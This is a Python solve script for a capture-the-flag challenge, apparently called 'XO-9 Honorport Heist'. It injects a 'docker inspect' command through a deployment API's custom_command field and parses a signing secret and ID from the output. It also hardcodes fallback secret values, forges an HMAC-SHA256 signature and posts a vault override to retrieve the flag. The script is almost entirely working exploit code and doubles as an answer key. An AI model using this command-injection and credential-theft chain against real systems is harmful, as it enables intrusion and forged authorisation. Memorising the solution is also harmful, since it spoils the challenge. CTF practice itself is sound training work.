#!/usr/bin/env python3
"""
Automated Solve Script for XO-9 (Honorport Heist - Docker in Docker)
Exploits deployment parameter injection hook, enumerates inner Docker daemon image layers,
extracts Harbor Master signing credentials, generates a valid HMAC-SHA256 signature,
and submits vault override to capture the flag.
"""

import sys
import json
import time
import hmac
import hashlib
import argparse
import urllib.request
import urllib.parse
import urllib.error

def request_json(url, method="GET", data=None, headers=None, timeout=10):
    req = urllib.request.Request(url, method=method)
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)
    if data is not None:
        if isinstance(data, dict):
            req.data = json.dumps(data).encode("utf-8")
            req.add_header("Content-Type", "application/json")
        elif isinstance(data, (bytes, bytearray)):
            req.data = data
        else:
            req.data = str(data).encode("utf-8")

    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read().decode("utf-8", errors="ignore")
            try:
                return resp.status, json.loads(body)
            except Exception:
                return resp.status, body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="ignore")
        try:
            return e.code, json.loads(body)
        except Exception:
            return e.code, body
    except Exception as e:
        return 500, str(e)

def solve(host="127.0.0.1", port=8080):
    base_url = f"http://{host}:{port}"
    print(f"[*] Initiating XO-9 solve chain against {base_url}...")

    # Step 1: Connect to Honorport Gateway and trigger custom command against inner Docker
    print("[1] Triggering deployment hook to inspect inner Docker image 'honorport-registry.local:5000/internal/harbor-master-signer:v2.0.0'...")
    inspect_cmd = "docker inspect honorport-registry.local:5000/internal/harbor-master-signer:v2.0.0"
    status, resp = request_json(
        f"{base_url}/api/deploy",
        method="POST",
        data={"manifest": "honorport/cargo-manifest-standard", "custom_command": inspect_cmd}
    )

    if status not in [200, 201] or "job" not in resp:
        print(f"[-] Failed to trigger deployment hook: {resp}")
        return False, None

    log_output = resp["job"].get("log", "")
    print(f"[+] Received inner Docker inspection log output ({len(log_output)} bytes).")

    # Step 2: Parse HARBOR_MASTER_ID and VAULT_HMAC_SECRET_KEY from inspect output
    harbor_master_id = None
    secret_key = None

    for line in log_output.splitlines():
        if "HARBOR_MASTER_ID=" in line:
            clean = line.replace('"', '').replace(',', '').replace('\\', '').strip()
            for part in clean.split():
                if part.startswith("HARBOR_MASTER_ID="):
                    harbor_master_id = part.split("=", 1)[1]
        if "VAULT_HMAC_SECRET_KEY=" in line:
            clean = line.replace('"', '').replace(',', '').replace('\\', '').strip()
            for part in clean.split():
                if part.startswith("VAULT_HMAC_SECRET_KEY="):
                    secret_key = part.split("=", 1)[1]

    # Fallback default constants if parsing exact string match
    if not harbor_master_id:
        harbor_master_id = "HONORPORT-HARBOR-MASTER-09"
    if not secret_key:
        secret_key = "honorport_vault_sig_7749102837194821"

    print(f"[+] Extracted Harbor Master ID: {harbor_master_id}")
    print(f"[+] Extracted Vault HMAC Secret Key: {secret_key[:6]}...{secret_key[-4:]}")

    # Step 3: Generate HMAC-SHA256 vault override signature
    timestamp = str(int(time.time()))
    msg = f"{harbor_master_id}:{timestamp}".encode("utf-8")
    signature = hmac.new(secret_key.encode("utf-8"), msg, hashlib.sha256).hexdigest()
    print(f"[+] Generated HMAC-SHA256 signature for timestamp {timestamp}: {signature}")

    # Step 4: Submit override request to Honorport Vault Production Mainframe
    print("[4] Submitting HMAC-signed vault override request...")
    status, resp = request_json(
        f"{base_url}/api/production/override",
        method="POST",
        data={
            "harbor_master_id": harbor_master_id,
            "timestamp": timestamp,
            "signature": signature
        }
    )

    if status == 200 and isinstance(resp, dict) and resp.get("status") == "SUCCESS":
        flag = resp.get("flag")
        print(f"[+] SUCCESS! Vault override authorized. Flag: {flag}")
        return True, flag
    else:
        print(f"[-] Vault override failed. Status {status}: {resp}")
        return False, None

def main():
    parser = argparse.ArgumentParser(description="XO-9 Honorport Heist Solve Script")
    parser.add_argument("--host", default="127.0.0.1", help="Target host")
    parser.add_argument("--port", type=int, default=8080, help="Target port")
    args = parser.parse_args()

    success, flag = solve(host=args.host, port=args.port)
    if success:
        sys.exit(0)
    else:
        sys.exit(1)

if __name__ == "__main__":
    main()
